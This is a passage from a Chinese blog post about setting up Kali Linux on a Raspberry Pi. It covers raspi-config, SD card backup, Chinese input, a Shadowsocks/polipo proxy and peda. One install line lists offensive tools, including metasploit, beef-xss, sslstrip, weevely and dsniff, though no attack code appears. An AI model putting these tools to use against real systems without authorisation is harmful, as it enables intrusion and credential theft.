sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]\[\033[38;5;15m\]\\$ \[$(tput sgr0)\]&#x27;</span></span><br><span class="line"><span class="comment"># PS1=&#x27;\[\033[38;5;196m\]\u@\h\[$(tput sgr0)\]\[\033[38;5;15m\]:\[$(tput sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]\[\033[38;5;15m\]\\$ \[$(tput sgr0)\]&#x27;</span></span><br><span class="line"><span class="comment"># PS1=&#x27;\[\033[38;5;196m\]\u@\h\[$(tput sgr0)\]\[\033[38;5;15m\]:[\[$(tput sgr0)\]\[\033[38;5;87m\]\w\[$(tput sgr0)\]\[\033[38;5;15m\]]\\$\[$(tput sgr0)\]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Commented out, don&#x27;t overwrite xterm -T &quot;title&quot; -n &quot;icontitle&quot; by default.</span></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="comment">#case &quot;$TERM&quot; in</span></span><br><span class="line"><span class="comment">#xterm*|rxvt*)</span></span><br><span class="line"><span class="comment">#    PROMPT_COMMAND=&#x27;echo -ne &quot;\033]0;$&#123;USER&#125;@$&#123;HOSTNAME&#125;: $&#123;PWD&#125;\007&quot;&#x27;</span></span><br><span class="line"><span class="comment">#    ;;</span></span><br><span class="line"><span class="comment">#*)</span></span><br><span class="line"><span class="comment">#    ;;</span></span><br><span class="line"><span class="comment">#esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable bash completion in interactive shells</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">shopt</span> -oq posix; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [-f /usr/share/bash-completion/bash_completion]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  <span class="keyword">elif</span> [-f /etc/bash_completion]; <span class="keyword">then</span></span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if the command-not-found package is installed, use it</span></span><br><span class="line"><span class="keyword">if</span> [-x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">function</span> command_not_found_handle &#123;</span><br><span class="line">            <span class="comment"># check because c-n-f could&#x27;ve been removed in the meantime</span></span><br><span class="line">                <span class="keyword">if</span> [-x /usr/lib/command-not-found]; <span class="keyword">then</span></span><br><span class="line">           /usr/lib/command-not-found -- <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">                   <span class="built_in">return</span> $?</span><br><span class="line">                <span class="keyword">elif</span> [-x /usr/share/command-not-found/command-not-found]; <span class="keyword">then</span></span><br><span class="line">           /usr/share/command-not-found/command-not-found -- <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">                   <span class="built_in">return</span> $?</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">           <span class="built_in">printf</span> <span class="string">&quot;%s: command not found\n&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">           <span class="built_in">return</span> 127</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601195845.png"></p><p>安装 raspi-config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade -y</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt autoremove</span><br><span class="line">apt-get autoclean</span><br><span class="line">wget http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/raspi-config_20180406+1_all.deb</span><br><span class="line">apt-get install -y triggerhappy lua5.1 alsa-utils psmisc</span><br><span class="line">dpkg -i raspi-config_20180406+1_all.deb</span><br><span class="line"><span class="built_in">rm</span> raspi-config_20180406+1_all.deb</span><br></pre></td></tr></table></figure><p>之后使用 raspi-config 配置树莓派。配置里没什么特别的，懂英文的应该都明白，比较重要的一项配置就是扩展文件系统，最开始 kali 并不会占用整个 SD 卡，只有在扩展完文件系统后才能使用全部的空间</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601212255.png"></p><p>翻译如下（鄙人根据理解和注释翻译，如有错误欢迎指正）：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Change User Password —— 更改用户名和密码</span><br><span class="line">Network Options —— 网络选项</span><br><span class="line">    Hostname —— 更改主机名</span><br><span class="line">    Wi-fi —— 更改 SSID 的名称和密码</span><br><span class="line">    Network interface names —— 更改网络接口的名称</span><br><span class="line">Boot Options —— 启动选项</span><br><span class="line">    Desktop / CLI —— 决定启动后进入终端还是进入桌面（建议不要更改）</span><br><span class="line">    Wait for Network at Boot —— 决定是否在启动时等待网络连接（建议不要开启，否则启动时会等好久，一直等到网络连接成功或者超时才启动）</span><br><span class="line">    Splash Screen —— 选择启动时是画面或文本</span><br><span class="line">Localisation Options —— 地区选项</span><br><span class="line">    Change Locale —— 更改地区</span><br><span class="line">    Change Timezone —— 更改时区</span><br><span class="line">    Change Keyboard Layout —— 更改键盘布局</span><br><span class="line">    Change Wi-fi Country —— 配置所在国家的 wifi 频道（可能不同的国家使用的 channel 不一样吧）</span><br><span class="line">Interfacing Options —— 接口选项</span><br><span class="line">    Camera —— 是否启用相机</span><br><span class="line">    SSH —— 是否启用 ssh（远程命令行连接）</span><br><span class="line">    VNC —— 是否启用 vnc（远程图像连接）</span><br><span class="line">    SPI —— 是否自动加载 SPI 内核模块</span><br><span class="line">    I2C —— 是否自动加载 I2C 内核模块</span><br><span class="line">    Serial —— 是否串行连接内核和 shell 的消息</span><br><span class="line">    1-Wire —— 是否启用 one-wire 接口</span><br><span class="line">Remote GPIO —— 是否启用远程访问 GPIO 引脚</span><br><span class="line">Overclock —— 是否超频</span><br><span class="line">Advanced Options —— 高级选项</span><br><span class="line">    Expand Filesystem —— 扩展文件系统（很重要，最好第一次配置的时候先选择这个）</span><br><span class="line">    Overscan —— 是否启用 Overscan（就是当屏幕上有黑条闪过的时候需要启动这个）</span><br><span class="line">    Memory Split —— 更改用于 GPU 的内存量</span><br><span class="line">    Audio —— 强制音频通过 HDMI 或 3.5mm 插孔输出</span><br><span class="line">    Resolution —— 设置特定的屏幕分辨率</span><br><span class="line">    Pixel Doubling —— 是否启用像素倍增</span><br><span class="line">    GL Driver —— 是否启动实验桌面 GL 驱动程序</span><br><span class="line">Update —— 更新 raspi-config</span><br><span class="line">About raspi-config —- 关于 raspi-config</span><br></pre></td></tr></table></figure><p>配置完成后需要重启一次，配置过分辨率之后你就会发现你的树莓派启动看起来更加漂亮了！</p><p>到这里树莓派 Kali 的安装基本就完成了，剩下的就需要按照个人喜好去个性化的设置自己的 kali 了。建议在配置好树莓派后备份一下系统，鄙人就是因为当时没有备份系统而只能重装 :)</p><p>备份系统的过程和烧录的过程是相似的，只不过在用 Win32DiskImager 选择的适合不是选择 write 而是选择 read，备份后会生成一个 img 文件，想恢复备份的话直接将 SD 卡用 SD card formatter 清空在烧录即可，过程和上文中一样。注意备份的话是将整个 SD 卡备份，也就是说鄙人 32G 的内存卡（理想情况没有内存损失），备份后的 img 文件也是 32G 的，不管里面装了多少软件。</p><p>另外树莓派 kali 默认是不安装什么工具的，所以需要自己安装，后文将会介绍鄙人在这之后对树莓派 kali 的配置，如果感兴趣可以接着往下看。</p><h1 id="常用软件"><a href="# 常用软件" class="headerlink" title="常用软件"></a>常用软件 </h1><p> 以下是鄙人安装的一些常用软件，有日常工具，如文本编辑图，图片查看器等等，也有一些渗透工具，还有一些系统的辅助工具，比如命令行补全增强等等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt -y --fix-broken install</span><br><span class="line">apt-get -y upgrade</span><br><span class="line">apt-get -y dist-upgrade</span><br><span class="line">apt-get -y install vim tree leafpad bash-completion wine macchanger cewl crunch curl tcpdump ettercap-graphical metasploit-framework beef-xss <span class="built_in">set</span> netcat dsniff driftnet ssldump fping polipo ngrep proxychains burpsuite nbtscan shadowsocks python-pip python3-pip whatweb sslstrip httrack wpscan gdb weevely cupp</span><br><span class="line">apt autoremove</span><br><span class="line">apt-get clean</span><br><span class="line">apt-get autoclean</span><br></pre></td></tr></table></figure><h1 id="中文支持以及输入法"><a href="# 中文支持以及输入法" class="headerlink" title="中文支持以及输入法"></a>中文支持以及输入法 </h1><p> 没有中文支持的话显示中文就会是乱码（打开浏览器会发现中文全是像麻将一样的方块），而且搜索的时候也很不方便，于是安装一下中文支持</p><ol><li><p>中文显示支持</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fonts-wqy-zenhei</span><br></pre></td></tr></table></figure><p> 重启之后就可以正常显示中文了</p></li><li><p>中文输入法</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install scim-pinyin</span><br></pre></td></tr></table></figure><p> 安装完成后命令行输入 scim 就可以打开输入法了，建议把 scim 加入开机启动命令的列表里</p></li></ol><hr><h1 id="去外面的世界看看"><a href="# 去外面的世界看看" class="headerlink" title="去外面的世界看看"></a>去外面的世界看看</h1><p>shadowsocks 安装完成后开始配置番羽土啬。鄙人的 shadowsocks.json 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxxxxxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;server_port&quot;</span><span class="punctuation">:</span> xxxxx<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;local_address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;local_port&quot;</span><span class="punctuation">:</span> <span class="number">1080</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxxxxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">600</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aes-256-cfb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fast_open&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>启动 shadowsockets</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sslocal -c /root/shadowsocks.json -d start <span class="comment"># 建议把这个放在开机启动的命令里</span></span><br><span class="line">curl ip.sb</span><br><span class="line">curl --socks5 127.0.0.1:1080 ip.sb</span><br></pre></td></tr></table></figure><p>在上面鄙人安装的软件中有 polipo，用这个来将 Sock5 代理转换为 http 代理，之后实现命令行番羽土啬，修改 /etc/polipo/config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file only needs to list configuration variables that deviate</span></span><br><span class="line"><span class="comment"># from the default values.  See /usr/share/doc/polipo/examples/config.sample</span></span><br><span class="line"><span class="comment"># and &quot;polipo -v&quot; for variables you can tweak and further information.</span></span><br><span class="line"></span><br><span class="line">logSyslog = <span class="literal">true</span></span><br><span class="line">logFile = /var/log/polipo/polipo.log</span><br><span class="line"></span><br><span class="line">proxyAddress = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"></span><br><span class="line">socksParentProxy = <span class="string">&quot;127.0.0.1:1080&quot;</span></span><br><span class="line">socksProxyType = socks5</span><br><span class="line">proxyPort = 8123</span><br><span class="line"></span><br><span class="line">chunkHighMark = 50331648</span><br><span class="line">objectHighMark = 16384</span><br><span class="line"></span><br><span class="line">serverMaxSlots = 64</span><br><span class="line">serverSlots = 16</span><br><span class="line">serverSlots1 = 32</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/polipo restart</span><br><span class="line">curl ip.sb</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8123 <span class="comment"># 启动代理</span></span><br><span class="line">curl ip.sb</span><br><span class="line"><span class="built_in">unset</span> http_proxy <span class="comment"># 取消代理</span></span><br><span class="line">curl ip.sb</span><br></pre></td></tr></table></figure><p>安装 Firefox proxy，之后就可以畅游外面的世界了</p><h1 id="安装 peda"><a href="# 安装 peda" class="headerlink" title="安装 peda"></a>安装 peda</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git  ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Geek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
